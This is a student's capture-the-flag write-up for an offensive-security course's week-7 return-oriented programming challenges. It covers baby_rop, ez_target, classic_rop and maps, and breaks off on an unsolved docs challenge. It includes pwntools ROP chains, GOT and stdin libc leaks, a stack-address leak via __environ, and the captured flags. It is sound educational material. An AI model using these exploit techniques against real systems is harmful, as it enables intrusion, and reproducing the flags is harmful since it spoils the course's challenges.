# CSGY 9223 Intro to Offensive Security
# Week 7 Challenges
# nam10102

## Challenge - Baby ROP
```aiignore
Can you pop a shell?

nc offsec-chalbroker.osiris.cyber.nyu.edu 1201
```
Inspecting baby_rop:
```aiignore
$ pwn checksec --file=baby_rop
[*] '/mnt/csgy9223_IntroOffSec/week_7/baby_rop'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Running baby_rop:
```aiignore
 ./baby_rop

        Can you pop a shell? like /bin/sh
        > /bin/sh
```
Let's inspect the binary using binja.

Using ROPgadget to see what's available:
```aiignore
ROPgadget --binary baby_rop | grep rdi
0x0000000000401199 : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x0000000000401196 : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x000000000040119c : mov ebp, esp ; pop rdi ; ret
0x000000000040119b : mov rbp, rsp ; pop rdi ; ret
0x0000000000401106 : or dword ptr [rdi + 0x404010], edi ; jmp rax
0x000000000040119e : pop rdi ; ret
0x000000000040119a : push rbp ; mov rbp, rsp ; pop rdi ; ret
0x0000000000401178 : stosd dword ptr [rdi], eax ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```
I see a rdi gadget at 0x000000000040119e, lets start there. Building my solver...

Looks like gets is being used to capture user input. We have around 0x18 bytes to take over the rip. First I need to find a "/bin/sh" string. And we found one:
```aiignore
hex(next(e.search(b"/bin/sh")))
'0x402026'
```
We have enough to build a rop chain. My rop chain and payload:
```python
chain = [
    target_rop.ret.address,
    target_rop.rdi.address,
    bin_sh,
    target_elf.plt.system
]

p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
```
The results are:
```python
$ ls
baby_rop
flag.txt
$ cat flag.txt
flag{4ll_g4dg3ts_1nclud3d!_a4d1bedea184635d}
```

## Challenge - EZ Target
```
Time to find some gadgets!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1203
```
We are given a glibc file as well as the binary ex_target.

```python
$ pwn checksec --file=ez_target
[*] '/mnt/csgy9223_IntroOffSec/week_7/ez_target'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Running binary:
```python
$ ./ez_target

Anything you'd like to ask me?
give me an address
Segmentation fault
(csgy9223py) nmaiorana@Nicks-Surface-6:~/csgy9223/csgy9223_IntroOffSec/week_7$ an address
```
Looks like the input takes in 8 bytes because the last part of my entry is left off. Opening with binja.

The input value indeed takes in 8 bytes. Then it's treated like a pointer. Since puts() was called once, I can send in the GOT address for puts to get a base address. It also takes in another input of up to 0x40 bytes. I'll use this to own the stack. Building solver...

First I need some gadgets. None in ez_target, checking glibc.
```python
r = ROP("./libc.so.6")
[*] '/mnt/csgy9223_IntroOffSec/week_7/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Loading gadgets for '/mnt/csgy9223_IntroOffSec/week_7/libc.so.6'
>>>
>>> r.rdi
Gadget(0x2a3e5, ['pop rdi', 'ret'], ['rdi'], 0x8)
```
Plan of attack:
- Get address of puts from the GOT since it's already called when we send in our GOT value
- Get base address using glibc puts() offset (we need this to get the address of system out of glibc)
- Create rop chain and payload adding the base address

The payload buffer is 0x58 bytes off of rip. How can I get there with 0x40 bytes? The memcpy() will copy the contents of the second buffer into the first buffer, giving me the length I need to do a BOF.

Since it's 0x18 bytes of the ret, I'll send in 0x18 bytes of filler, followed by my rop chain.

```python
chain = [
    ret_gadget.address + base_address,
    rdi_gadget.address + base_address,
    bin_sh + base_address,
    system_address + base_address
]


p.recvline(b'shell!')
p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
```

Results:
```aiignore
    b'ls\n'
[DEBUG] Received 0x13 bytes:
    b'ez_target\n'
    b'flag.txt\n'
ez_target
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x31 bytes:
    b'flag{l1bc_g4dg3ts_f0r_th3_w1n!_22a3e11c237e7557}\n'
flag{l1bc_g4dg3ts_f0r_th3_w1n!_22a3e11c237e7557}
```

## Challenge - Classic ROP
```
Can you still pop a shell?

nc offsec-chalbroker.osiris.cyber.nyu.edu 1202
```
Inpecting the file:
```aiignore
$ checksec classic_rop
[*] '/mnt/csgy9223_IntroOffSec/week_7/classic_rop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Running the binary:
```aiignore
$ ./classic_rop
Let's ROP!
123456
123456
```
Let's look using binja. So main asks for input, but it calls another function get_number() get the length of the input from fgets(). This means we can control the number of bytes we send in and have the ability to BOF the return pointer. But we need some rops first and quite probably, a pointer to "/bin/sh". We did get a libc binary as well as the main one.

Since we need to call system out of libc, since there are none available in the main binary (nore did we see a "/bin/sh"), we need to leak some data to get a base address.

My plan of attack has changed a bit. I'm first going to have to get an address. Since puts() was called in main, I'll have to use it to send me the address from puts() in the GOT. Then I can return to the main function to pop a shell.

First things first, lets see if we can get the address of puts(). Creating a solver. For this we need an rdi rop:
```aiignore
$ ROPgadget --binary ./classic_rop | grep rdi
0x00000000004011f9 : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000004011f6 : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000004011fc : mov ebp, esp ; pop rdi ; ret
0x00000000004011fb : mov rbp, rsp ; pop rdi ; ret
0x0000000000401166 : or dword ptr [rdi + 0x404060], edi ; jmp rax
0x00000000004011fe : pop rdi ; ret
0x00000000004011fa : push rbp ; mov rbp, rsp ; pop rdi ; ret
```
And we have one in the main binary at: 0x00000000004011fe. We'll also need to compute the place to jump back into main. So we'll have to compile some assembler to get an offset.

The bof_buf in main is 0x28 bytes off the rip, so I'll need to add 0x28 bytes of filler:
- 0x28 filler
- 0x8 rdi gadget address
- 0x8 puts() got address
- 0x8 main + offset into main

The rop chain looks like:
```aiignore
chain = [
    rdi_gadget.address,
    puts_got_address,
    puts_plt_address,
    main_address + main_offset_into
]
```
72 (0x48) bytes + 1 (LF) , the length I'll send to the first input. Which needs to be a string "73"

Once I was able to get the puts() address, I computed the base address which allowed me to reference a "bin/sh" string and the system address. Then I constructed a rop chain to pop the shell:
```aiignore
chain = [
    rdi_gadget.address,
    bin_sh_address,
    system_address
]
```
The results are:
```aiignore
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x15 bytes:
    b'classic_rop\n'
    b'flag.txt\n'
classic_rop
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x3b bytes:
    b'flag{th4t_w4s_r0pp1ng_b3f0r3_gl1bc_2.34!_ae1228fe5a2871f0}\n'
flag{th4t_w4s_r0pp1ng_b3f0r3_gl1bc_2.34!_ae1228fe5a2871f0}
```

## Challenge - Maps
```
This is a very kind Maps App! It will help you find a nice place to store your stuff!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1205
```

Libc is provided for this one. 

```aiignore
7$ checksec maps
[*] '/mnt/csgy9223_IntroOffSec/week_7/maps'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Running the binary:
```aiignore
 ./maps
Welcome to the Free Maps App!
As a new customer, you get one hint for free: ����

Where do you want to go?
Home
Segmentation fault
```

They are passing some data to us after "free: ". Going to binja.

They are providing the address of stdin in the text. And it looks like that entry is used as some sort of address.

Looks like we need to use the stdin address to compute the base address. Let's see if this works:

As a test used the address of stdin to compute a base address. Using 

```
stdin_offset = libc_elf.symbols._IO_2_1_stdin_
base_address = stdin_address - stdin_offset```
```
I computed the base address and now have:

```
stdin address: 0x7ffff7fa48e0
Libc base address: 0x7ffff7da1000
system address: 0x7ffff7df9750
Found /bin/sh at 0x7ffff7f6c42f
```
Using gdb to see if these are correct:
```aiignore
x/s 0x7ffff7f6c42f
[DEBUG] Received 0x1e bytes:
0x7ffff7f6c42f: "/bin/sh"
```
Good, we now have broken ASLR.

Next, it from my experimenting, I need to get the stack address for the input variable we want to overflow. I'll use the symbol for "__environ" to get this address.

```aiignore
$ readelf -Ws libc.so.6 | grep __environ
   724: 0000000000222200     8 OBJECT  GLOBAL DEFAULT   35 __environ@@GLIBC_2.2.5
```
Using this code snippet, I send the address of the environ to get the address where the environ is in memory, and the plan is to use this to compute the address in the stack:

```aiignore
environ_address = libc_elf.symbols.__environ + base_address
print(f'Address of environ: {hex(environ_address)}')
p.send(p64(environ_address))
address_of_envvars = int(p.recvline().strip(), 16)

Address of envvars: 0x7fffffffddd8 
```

The 2nd to last bit of data to be sent is the address where the payload will be stored. In order to get this we need to determine the offset between the envs and the stack. Also since a stack canary is being used, I'll have to target the RIP part of the stack to jump the canary.

Looking at the stack, it appears as though the beginning of the stack is at address 0x00007fffffffdc90 and is -x148 bytes off of the environ space. Since my target variable is -0x18 bytes from this I'll compute my target address to be:

```aiignore
0x7fffffffddd8 - 0x00007fffffffdc90 + 0x10 (+0x20 on remote)
```

Because there is a canary check, we need to skip overwriting the RPB and go straight to the RIP.

Plan of attack:
- Get base address using address of stdin
- Get get the stack address
- Send in the stack address plus the offset to the RIP
- Send in a rop chain that starts with two ret gadgets, followed by an rdi gadget, bin/sh and the system call

While locally this worked for me, on the remote server the offset between env and the stack were different due to different versions of libc. On the remote server I was hitting the canary and getting a "stack smashing" error. By adding 0x10 bytes to my original value I got the flag:

```aiignore
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xe bytes:
    b'flag.txt\n'
    b'maps\n'
flag.txt
maps
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x32 bytes:
    b'flag{th4t_w4s_s0m3_fun_r0pp1ng!_0513409d87a9c7ab}\n'
flag{th4t_w4s_s0m3_fun_r0pp1ng!_0513409d87a9c7ab}
```

## Challenge - docs
```aiignore
ROP

nc offsec-chalbroker.osiris.cyber.nyu.edu 1204
```
Inspecting the binary:
```aiignore
docs'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Running the binary:
```aiignore
./docs
                                                                                                                                                     Welcome to my new Word Processor!

        Please input your text: Hello World!
        Now you can add the title: Hello

        Saving...

```
Going to binja.

Main calls init(), nothing there then calls create_document(). create_document() uses a buffer that is 0x1008 off the stack. It uses fgets() to read 0x1000 bytes into the buffer. This buffer is then copied to the address of document in the .bss section. After it returns the value of add_title().

add_title() reads the input into a buf variable which is 0x38 bytes into the stack.

We can set a return pointer in add_title() but it looks like NX is set, so we won't be able to execute off the stack (or heap). We can possibly run a shell script at the address of document. Looking at readelf:

```aiignore
$ readelf -Ws docs | grep document
    26: 0000000000404080  4096 OBJECT  GLOBAL DEFAULT   26 document
    29: 00000000004011ea   101 FUNC    GLOBAL DEFAULT   15 create_document
```

We should be able to set the return for add_title() to a shell script at the address for document. If we can execute in that space. We may need to make several calls to leak information first. Let's start there to see if we can get the address of system by leaking the address of puts. However, this does not feel like a ROP, so I might be way off the mark.

The puts GOT is at 0x404018. 

So I can't overflow the buffer in add_title(). My next option is to see if we can overflow the document address to overwrite the return address from create_document. Since it will be first on the stack, and from what I can see the buffer is 0x10008 from the stack. Since the input to create_document() only reads in 0x1000 bytes, I'm not sure if this is possible either. 

After thinking about it, I don't think it's possible since the read in create_document only pulls in 0x1000 bytes. So I'll be short of the RIP.

Due to time constraints, I'm going to punt on this one.